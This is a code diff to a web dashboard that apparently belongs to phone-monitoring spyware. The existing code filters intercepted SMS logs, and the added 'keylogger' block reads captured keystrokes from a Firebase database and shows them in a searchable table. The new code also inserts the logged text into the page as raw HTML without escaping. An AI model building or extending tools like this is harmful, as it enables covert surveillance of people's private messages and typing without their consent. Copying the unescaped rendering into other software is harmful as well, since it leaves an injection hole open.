@@ -229,6 +229,47 @@ function initializeDashboard() {
   ["filter-name", "filter-message", "filter-number", "filter-date", "filter-address"].forEach(id => {
     document.getElementById(id)?.addEventListener("input", renderSMSLogs);
   });
+
+  //Start of keylogger
+ // Start of keylogger
+const keylogBody = document.getElementById("logBody");
+const keylogSearch = document.getElementById("searchInput");
+
+if (keylogBody && keylogSearch) {
+  const keylogs = [];
+  const keylogRef = ref(db, `users/${uid}/keylogger`);
+
+  onChildAdded(keylogRef, (snap) => {
+    const data = snap.val();
+    if (data) {
+      keylogs.push(data);
+      renderKeylogs();
+    }
+  });
+
+  function renderKeylogs() {
+    const query = keylogSearch.value.toLowerCase();
+    keylogBody.innerHTML = "";
+
+    const filtered = keylogs.filter(log =>
+      !query || (log.text || "").toLowerCase().includes(query)
+    );
+
+    filtered.forEach(log => {
+      const row = document.createElement("tr");
+      row.innerHTML = `
+        <td style="padding: 8px; border-bottom: 1px solid #444;">${new Date(log.timestamp || Date.now()).toLocaleString()}</td>
+        <td style="padding: 8px; border-bottom: 1px solid #444;">${log.text || ''}</td>
+      `;
+      keylogBody.appendChild(row);
+    });
+  }
+
+  keylogSearch.addEventListener("input", renderKeylogs);
+}
+// End of keylogger
+
+// End of keylogger
 }
 
 function displayNoneDashboard() {
